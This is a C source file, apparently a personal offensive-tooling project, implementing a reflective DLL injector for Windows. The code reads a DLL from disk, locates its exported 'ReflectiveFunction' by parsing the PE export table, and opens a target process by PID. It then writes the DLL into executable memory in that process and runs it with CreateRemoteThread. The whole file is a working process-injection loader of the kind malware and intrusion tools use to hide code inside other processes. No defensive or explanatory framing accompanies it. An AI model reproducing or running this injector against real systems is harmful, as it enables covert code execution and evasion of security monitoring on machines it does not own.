//
// Created by j4ck on 3/6/24.
//
#include <windows.h>
#include <wchar.h>
#include <stdio.h>


DWORD Rva2Offset(IN DWORD dwRVA, IN PBYTE pBaseAddress) {

    PIMAGE_NT_HEADERS		pImgNtHdrs		= NULL;
    PIMAGE_SECTION_HEADER	pImgSectionHdr	= NULL;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBaseAddress + ((PIMAGE_DOS_HEADER)pBaseAddress)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return 0x00;

    pImgSectionHdr	= (PIMAGE_SECTION_HEADER)((PBYTE)&pImgNtHdrs->OptionalHeader + pImgNtHdrs->FileHeader.SizeOfOptionalHeader);

    // Iterates through the PE sections
    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++){

        // If the RVA is located inside the "i" PE section
        if (dwRVA >= pImgSectionHdr[i].VirtualAddress && dwRVA < (pImgSectionHdr[i].VirtualAddress + pImgSectionHdr[i].Misc.VirtualSize))
            // Calculate the delta and add it to the raw pointer
            return (dwRVA - pImgSectionHdr[i].VirtualAddress) + pImgSectionHdr[i].PointerToRawData;
    }

    printf("\t[!] Cound'nt Convert The 0x%0.8X RVA to File Offset! \n", dwRVA);
    return 0x00;
}



BOOL ReadDll(IN OUT PBYTE* ppBuffer, IN OUT PDWORD pdwDllSize) {
    HANDLE hFile = NULL;
    DWORD dwFileSize = 0;
    PBYTE pTempBuffer = NULL;

    hFile = CreateFileW(L"RflDll.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateFileW Failed %d\n", GetLastError());
        return FALSE;
    }
    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        wprintf(L"[!] GetFileSize Failed %d\n", GetLastError());
    }
    pTempBuffer = LocalAlloc(0, dwFileSize);
    if (!pTempBuffer) {
        wprintf(L"[!] HeapAlloc Failed %d\n", GetLastError());
        return FALSE;
    }

    DWORD dwBytesWritten = 0;
    if (!ReadFile(hFile, pTempBuffer, dwFileSize, &dwBytesWritten, NULL)) {
        wprintf(L"[!] ReadFile Failed %d\n", GetLastError());
        return FALSE;
    }

    // Clean up

    *ppBuffer = pTempBuffer;
    *pdwDllSize = dwFileSize;

    CloseHandle(hFile);

    return TRUE;
}

BOOL GetReflectiveFunctionOffset(ULONG_PTR ulDllBuffer, PDWORD pdwReflectiveFunction) {

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)ulDllBuffer;
    DWORD dwReflectiveFunctionOffset = 0;

    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        wprintf(L"[!] DOS SIGNATURE FAILED");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(ulDllBuffer + (DWORD)pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        wprintf(L"[!] NT SIGNATURE FAILED");
        return FALSE;
    }

    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)(&pNtHeaders->OptionalHeader);

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ulDllBuffer + Rva2Offset(pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, (PBYTE)ulDllBuffer));

    PDWORD pAddressOfNames = (PDWORD)(ulDllBuffer + Rva2Offset(pExportDirectory->AddressOfNames, (PBYTE)ulDllBuffer));
    PDWORD pAddressOfFunctions = (PDWORD)(ulDllBuffer + Rva2Offset(pExportDirectory->AddressOfFunctions, (PBYTE)ulDllBuffer));

    for (int i=0; i <= pExportDirectory->NumberOfFunctions; i++) {
        PCHAR pFunctionName = (PCHAR)(ulDllBuffer + (Rva2Offset(pAddressOfNames[i], (PBYTE)ulDllBuffer)));
        if (strcmp("ReflectiveFunction", pFunctionName) == 0) {
            dwReflectiveFunctionOffset = (DWORD)Rva2Offset(pAddressOfFunctions[i], (PBYTE)ulDllBuffer);

            *pdwReflectiveFunction = dwReflectiveFunctionOffset;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL LoadAndExecuteReflectiveDLL(PBYTE pDllBuffer, DWORD dwDllSize, DWORD dwReflectiveFunctionOffset, PDWORD pdwThreadId, DWORD dwPID) {
    LPVOID lpBuffer = NULL;
    HANDLE hProcess = NULL;

    HANDLE hThread = NULL;
    DWORD dwThreadId = 0;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPID); // Replace with process enumerated handle
    if (!hProcess) {
        wprintf(L"[!] OpenProcessFailed %d\n", GetLastError());
        return FALSE;
    }

    lpBuffer = VirtualAllocEx(hProcess, lpBuffer, dwDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpBuffer) {
        wprintf(L"[!] VirtualAlloc Failed %d\n", GetLastError());
        return FALSE;
    }
    SIZE_T dwBytesWritten = 0;
    if (!WriteProcessMemory(hProcess, lpBuffer, pDllBuffer, dwDllSize, &dwBytesWritten)) {
        wprintf(L"[!] WriteProcessMemory Failed %d", GetLastError());
        return FALSE;
    }
    hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)(lpBuffer + dwReflectiveFunctionOffset), 0, 0, &dwThreadId);
    if (!hThread || dwThreadId == 0) {
        wprintf(L"[!] CreateRemoteThread Failed %d\n", GetLastError());
        return FALSE;
    }
    *pdwThreadId = dwThreadId;
    // Cleanup
    CloseHandle(hProcess);
    return TRUE;



}

int wmain(int argc, wchar_t* argv[]) {
    PBYTE pBuffer = NULL;
    DWORD dwDllSize = 0;
    DWORD dwThreadId = 0;
    ReadDll(&pBuffer, &dwDllSize);
    DWORD dwReflectiveFunctionOffset = 0;
    GetReflectiveFunctionOffset((UINT_PTR)pBuffer, &dwReflectiveFunctionOffset);
    LoadAndExecuteReflectiveDLL(pBuffer, dwDllSize, dwReflectiveFunctionOffset, &dwThreadId, _wtoi(argv[1]));
    wprintf(L"[+] LoadAndExecute Finished with Thread ID: %d\n", dwThreadId);
    getchar();
    return 0;
}